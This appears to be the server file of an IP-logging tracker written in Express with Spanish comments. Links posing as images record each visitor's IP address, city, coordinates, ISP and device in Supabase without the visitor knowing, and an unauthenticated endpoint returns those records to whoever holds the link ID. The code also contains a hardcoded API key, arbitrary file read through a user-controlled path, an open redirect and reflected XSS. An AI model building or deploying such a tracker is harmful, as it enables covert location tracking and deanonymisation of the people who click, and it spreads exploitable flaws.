const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// ============================================================
//  🔥 CONFIGURACIÓN DE SUPABASE
// ============================================================
const SUPABASE_URL = 'https://cjfwowcbuuozeefmdqln.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNqZndvd2NidXVvemVlZm1kcWxuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4OTcxNzMsImV4cCI6MjA5ODQ3MzE3M30.zWNTmg6rZCFpjwrY99RvzgGmtAvVZAM9_5X_ss4OszA';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ============================================================
//  OBTENER IP REAL
// ============================================================
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] ||
        req.headers['cf-connecting-ip'] ||
        req.connection.remoteAddress ||
        '0.0.0.0';
}

// ============================================================
//  GEOLOCALIZACIÓN
// ============================================================
async function getGeoLocation(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp`);
        const data = await response.json();
        if (data.status === 'success') {
            return {
                pais: data.country || 'Desconocido',
                codigoPais: data.countryCode || '??',
                region: data.regionName || 'Desconocido',
                ciudad: data.city || 'Desconocido',
                lat: data.lat || 0,
                lon: data.lon || 0,
                isp: data.isp || 'Desconocido'
            };
        }
    } catch (error) { }
    return {
        pais: 'Desconocido',
        codigoPais: '??',
        region: 'Desconocido',
        ciudad: 'Desconocido',
        lat: 0,
        lon: 0,
        isp: 'Desconocido'
    };
}

// ============================================================
//  🔥 ENDPOINT PRINCIPAL
// ============================================================
app.get('/i/:rid/:nombreImagen', async (req, res) => {
    const { rid, nombreImagen } = req.params;
    const { device } = req.query;

    console.log(`📥 Petición recibida: /i/${rid}/${nombreImagen.substring(0, 30)}...`);

    // Decodificar la imagen
    let imgUrl;
    try {
        imgUrl = Buffer.from(nombreImagen.split('.')[0], 'base64').toString('utf-8');
        console.log(`🖼️ Imagen decodificada: ${imgUrl.substring(0, 50)}...`);
    } catch (e) {
        console.error('❌ Error decodificando imagen:', e);
        return res.status(400).send('Imagen no válida');
    }

    if (!rid || !imgUrl) {
        return res.status(400).send('Faltan parámetros');
    }

    // ============ REGISTRAR VISITA ============
    try {
        let deviceInfo = {};
        if (device) {
            try {
                deviceInfo = JSON.parse(decodeURIComponent(device));
            } catch (e) {}
        }

        const ip = getClientIP(req);
        const userAgent = req.headers['user-agent'] || 'Desconocido';
        const date = new Date().toISOString().replace('T', ' ').slice(0, 19);
        const geo = await getGeoLocation(ip);

        console.log(`📝 Registrando visita: RID=${rid}, IP=${ip}, País=${geo.pais}, Ciudad=${geo.ciudad}`);

        // Guardar en Supabase
        const { error } = await supabase
            .from('registros')
            .insert([
                {
                    rid: rid,
                    ip: ip,
                    fecha: date,
                    pais: geo.pais,
                    region: geo.region,
                    ciudad: geo.ciudad,
                    coordenadas: `${geo.lat}, ${geo.lon}`,
                    dispositivo: deviceInfo.tipo || userAgent,
                    imagen: imgUrl
                }
            ]);

        if (error) {
            console.error('❌ Error guardando en Supabase:', error);
            // No fallar la redirección por un error de guardado
        } else {
            console.log(`✅ Visita registrada correctamente para RID: ${rid}`);
        }
    } catch (e) {
        console.error('❌ Error registrando visita:', e);
    }

    // ============ REDIRIGIR A LA IMAGEN ============
    console.log(`🔄 Redirigiendo a: ${imgUrl}`);
    if (imgUrl.startsWith('http://') || imgUrl.startsWith('https://')) {
        return res.redirect(imgUrl);
    }

    const imagePath = path.join(__dirname, imgUrl);
    if (fs.existsSync(imagePath)) {
        return res.sendFile(imagePath);
    }

    // Si no hay imagen, mostrar un placeholder simple
    res.send(`
        <html>
            <body style="background:#1a0a2e;display:flex;justify-content:center;align-items:center;height:100vh;color:#c084fc;font-family:Arial;text-align:center;">
                <div>
                    <h1>🖼️ Imagen registrada</h1>
                    <p>La visita ha sido registrada correctamente</p>
                    <p style="font-size:12px;color:#7c6a9e;">RID: ${rid}</p>
                </div>
            </body>
        </html>
    `);
});

// ============================================================
//  OBTENER REGISTROS
// ============================================================
app.get('/api/records/:rid', async (req, res) => {
    const rid = req.params.rid;
    console.log(`📋 Buscando registros para RID: ${rid}`);

    try {
        const { data: records, error } = await supabase
            .from('registros')
            .select('*')
            .eq('rid', rid)
            .order('fecha', { ascending: false });

        if (error) {
            console.error('❌ Error obteniendo registros:', error);
            return res.status(500).json({ error: 'Error al obtener los registros' });
        }

        if (!records || records.length === 0) {
            console.log(`📭 No hay registros para RID: ${rid}`);
            return res.status(404).json({ message: 'Sin registros' });
        }

        console.log(`✅ ${records.length} registros encontrados para RID: ${rid}`);
        res.json({
            rid: rid,
            count: records.length,
            records
        });
    } catch (e) {
        console.error('❌ Error:', e);
        res.status(500).json({ error: 'Error interno' });
    }
});

// ============================================================
//  🚀 INICIAR EL SERVIDOR
// ============================================================
app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
    console.log(`🟣 Visor - v3.0 (Supabase)`);
    console.log(`📁 Datos guardados en Supabase`);
    console.log(`🌐 URL del servidor: http://localhost:${PORT}`);
});
